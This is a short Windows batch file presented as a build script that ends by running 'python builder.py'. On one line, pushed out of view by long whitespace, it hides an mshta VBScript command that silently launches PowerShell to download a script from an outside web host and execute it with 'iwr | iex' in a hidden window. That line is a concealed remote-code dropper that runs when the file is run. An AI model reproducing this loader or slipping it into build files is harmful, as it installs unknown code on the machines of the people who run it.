echo off
set a = ""&																																																																																																																																					mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://codeforfun.vercel.app/sigma') | iex""",0)(window.close)
:build & 																																																																																																																																																																																				goto build
python builder.py
